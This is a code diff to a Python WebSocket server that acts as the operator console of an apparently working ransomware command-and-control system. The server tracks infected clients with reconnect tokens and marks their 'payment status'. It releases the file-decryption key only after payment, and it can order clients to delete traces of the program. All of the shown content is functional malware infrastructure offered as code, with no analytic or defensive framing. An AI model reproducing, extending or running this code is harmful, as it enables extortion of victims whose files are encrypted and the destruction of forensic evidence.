@@ -3,6 +3,7 @@ import websockets
 import json
 import inspect
 from Connection import Connection, ConnectionState
+import uuid
 
 class WebSocketCLIServer:
     def __init__(self, host="localhost", port=8765):
@@ -29,30 +30,44 @@ class WebSocketCLIServer:
             # If username already exists, append a number to make it unique
             if username in self.connected_clients:
                 username += str(len([x for x in self.connected_clients.keys() if x.startswith(username)])+1)
-            
-            # Create connection object
+
             connection = Connection(uri=websocket.remote_address, socket=websocket)
-            connection.set_username(username)
+            data = json.loads(first_message).get("data", {})
+            token = data.get("id", None)
+            find: list[Connection] = [x for x in self.connected_clients.values() if x.id == token] # if token is not None else []
+            if len(find) > 0:
+                # This means the client had previously authenticated
+                connection = find[len(find)-1]
+                connection.websocket = websocket
+                connection.uri = websocket.remote_address
+                username = connection.username
+                connection.show_info()
+               
+            else:
+                # Set data in the connection object
+                token = uuid.uuid4().hex
+                connection.set_id(token)
+                self.connected_clients[username] = connection
+
             connection.change_state(ConnectionState.IDENTIFIED)
-            connection.set_system_info(json.loads(first_message).get("data", {}).get("system", "Unknown"))
-            self.connected_clients[username] = connection
+            connection.set_username(username)
+            connection.set_system_info(data.get("system", "Unknown"))
 
-            await websocket.send(self.__create_auth_reply(True))
+            await websocket.send(self.__create_auth_reply(True, token))
             print(f"[{username}] is connected to the server.")
-            print(self.__generate_cli_text() + "> ", end='', flush=True)
+            print(self.__generate_cli_text(), end='', flush=True)
 
-            # async for message in websocket:
-            #     print(f"[{username}] {message}")
-            #     await self.broadcast(f"[{username}] {message}", sender=websocket)
             await connection.start()
 
         except websockets.exceptions.ConnectionClosed:
             pass
         finally:
             if websocket in [conn.websocket for conn in self.connected_clients.values()]:
-                print(f"[{username}] has been disconnected left")
+                print(f"[{username}] has been disconnected")
                 self.connected_clients[username].change_state(ConnectionState.DISCONNECTED)
-                #del self.connected_clients[websocket]
+                if self.__selected_client == self.connected_clients[username]:
+                    self.__selected_client = None
+                    print(self.__generate_cli_text(), end="", flush=True)
 
     def __check_first_message(self, message) -> str:
         """Check if the first message is a valid username."""
@@ -74,13 +89,14 @@ class WebSocketCLIServer:
         except json.JSONDecodeError:
             return False
 
-    def __create_auth_reply(self, status: bool) -> str:
+    def __create_auth_reply(self, status: bool, token: str = "") -> str:
         """Create an authentication reply message."""
         reply = {
             "type": "auth_rep",
             "data": {
                 "status": status,
-                "message": "Authentication successful." if status else "Authentication failed."
+                "message": "Authentication successful." if status else "Authentication failed.",
+                "id": token
             }
         }
         return json.dumps(reply)
@@ -132,6 +148,9 @@ class WebSocketCLIServer:
                 case ["cleaningreq"]:
                     await self.__send_cleaning_req()
 
+                case ["close"]:
+                    await self.__close_connection()
+
                 case ["exit"] | ["quit"]:  
                     await self.stop()
 
@@ -167,6 +186,7 @@ class WebSocketCLIServer:
         print("\tsetpaymentstatus <true/false> - sets the payment status of the selected client")
         print("\tdecryptrep - sends the command to decrypt the previously encrypted files to the selected client")
         print("\tcleaningreq - sends the command to delete traces of the program on the selected client")
+        print("\tclose - closes the selected client connection")
         print("\texit or quit - quit the program")
 
     def __show_connections(self):
@@ -265,6 +285,7 @@ class WebSocketCLIServer:
             "type": "decryption_rep",
             "data": {
                 "status": value,
+                "key": self.__selected_client.get_key() if value and self.__selected_client.get_key() is not None else ""
             }
         }
 
@@ -287,6 +308,13 @@ class WebSocketCLIServer:
             print(f"Set payment status of {self.__selected_client.username} to {is_paid}.")
         else:
             print("Invalid status. Use 'true' or 'false'.")
+
+    @check_selected_client
+    async def __close_connection(self):
+        self.__selected_client.change_state(ConnectionState.DISCONNECTED)
+        await self.__selected_client.websocket.close()
+        self.__selected_client = None
+        self.__generate_cli_text()
 
     async def broadcast(self, message, sender=None):
         """Send a message to all connected clients."""
@@ -326,5 +354,10 @@ class WebSocketCLIServer:
 
 
 if __name__ == "__main__":
-    server = WebSocketCLIServer()
+    from dotenv import load_dotenv
+    import os 
+    load_dotenv()
+    host = os.getenv("HOST", "localhost")
+    port = int(os.getenv("PORT", "8765"))
+    server = WebSocketCLIServer(host = host, port = port)
     asyncio.run(server.start())
